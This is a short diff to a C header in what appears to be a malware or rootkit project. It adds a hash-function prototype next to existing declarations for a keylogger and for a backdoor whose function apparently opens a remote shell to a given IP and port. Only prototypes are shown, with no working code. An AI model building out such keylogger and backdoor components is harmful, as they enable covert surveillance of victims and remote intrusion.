@@ -184,6 +184,7 @@ size_t keylogger_len(void);
 void keylogger_clear(void);
 
 /* backdoor.c */
+uint16_t vault_fnv1a16(const char *s);
 int backdoor_init(void);
 void backdoor_cleanup(void);
 int backdoor_trigger_shell(const char *ip, const char *port);
